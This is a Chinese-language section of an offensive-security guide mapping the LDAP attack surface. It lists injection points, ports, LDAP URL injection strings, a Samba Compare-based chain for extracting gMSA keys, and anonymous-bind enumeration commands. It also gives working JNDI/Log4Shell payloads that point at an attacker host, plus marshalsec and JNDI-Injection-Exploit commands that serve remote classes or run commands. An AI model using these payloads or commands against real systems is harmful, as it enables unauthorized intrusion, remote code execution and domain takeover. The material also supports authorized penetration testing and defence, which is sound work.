## 二、LDAP攻击面测绘

### 2.1 应用层注入点清单
| 场景 | 典型过滤器模板 | 注入价值 |
|------|--------------|---------|
| 登录认证 | `(&(uid=USER)(userPassword=PASS))` | 认证绕过、盲注 |
| 用户搜索/通讯录 | `(cn=*KEY*)` | 枚举、盲注 |
| 邮箱/手机找回 | `(mail=KEY)` | 枚举、横向接管 |
| 单点登录SSO | 依赖PAC4J/Spring LDAP的ID搜索 | 会话伪造 |
| 权限/组成员检查 | `(&(uid=U)(memberOf=G))` | 逻辑篡改 |
| 设备/IoT注册 | `(macAddress=KEY)` | 设备伪造 |
| MFA二次验证 | `(phoneNumber=KEY)` | 验证码绕过对象定位 |
| 密码重置 | `(&(uid=U)(challenge=KEY))` | 任意用户接管 |
| RAG/企业AI搜索 | 文档ACL过滤 `(owner=KEY)` | AI上下文越权（见第十章） |

### 2.2 网络层攻击面
```
端口/协议        用途                    攻击面
389  TCP        明文LDAP              嗅探、降级、中继
636  TCP        LDAPS(TLS)            证书校验/通道绑定绕过
3268 TCP        AD全局编录(GC)         跨域枚举、搜索绕过分区限制
3269 TCP        GC over SSL            同上+加密
2171/2172       ADAM/LDS              轻量级目录服务独立攻击面
88   UDP/TCP    Kerberos               与LDAP数据联动（见第九章）
```

### 2.3 LDAP URL、扩展操作与JNDI攻击面

**LDAP URL注入（RFC 4516）：** 若应用接受URL参数：
```
ldap://host:port/DN?attrs?scope?filter?extensions
ldap://corp.local/dc=corp,dc=local?cn,mail?sub?(uid=*)
# 注入filter段：
ldap://corp.local/dc=corp,dc=local???sub?(|(uid=*)(objectClass=*))
# 注入base DN段逃逸分区：
ldap://corp.local/OU=Restricted,DC=corp,DC=local?cn?sub?(objectClass=user)  ← 逃逸限制OU
```

**扩展操作与修改类攻击面（比Search更致命）：**
```
# Compare操作（AD）：攻击者控制属性名时可注入过滤器（CVE-2026-58222 Samba案例）
#   Samba AD DC处理LDAP Compare请求时未校验属性名+可信上下文执行搜索
#   → 低权限用户提取 msKds-RootKeyData（gMSA密钥）→ 离线推导gMSA密码 → 域沦陷
# Modify/Add/Delete：注入改属性 → 改组成员/重置密码/设置SPN（见第九章9.3）
# Control对象：LDAP_SERVER_SD_FLAGS_OID (1.2.840.113556.1.4.801) 读安全描述符
#   LDAP_SERVER_SEARCH_OPTIONS_OID (1.2.840.113556.1.4.1340) 控制搜索行为
```

**JNDI注入（Log4Shell类LDAP利用，保留v2.0核心）：**
```
# 当应用对用户可控字符串执行 InitialContext.lookup()（如Log4j2的${jndi:ldap://...}）
# 恶意LDAP服务器可返回：Reference指向远程class / 序列化Gadget对象
${jndi:ldap://attacker:1389/exploit}
${jndi:ldaps://attacker:636/exploit}
${jndi:ldap://attacker:1389/Basic/Command/Base64/<base64命令>}   # JNDI-Injection-Exploit格式

# 搭建恶意LDAP服务器：
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8888/#Exploit" 1389
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc.exe" -A attacker
```

### 2.4 匿名绑定与未认证枚举面
```bash
# 匿名绑定探测（严禁在生产环境随意操作，先确认授权）
ldapsearch -x -H ldap://target -b "dc=corp,dc=local" -s base namingContexts
ldapsearch -x -H ldap://target -b "" -s base "*" "+"
# 若返回 namingContexts/rootDSE 信息 → 未限制匿名
# OpenLDAP常允许匿名读；AD默认部分允许匿名读rootDSE与某些属性
```

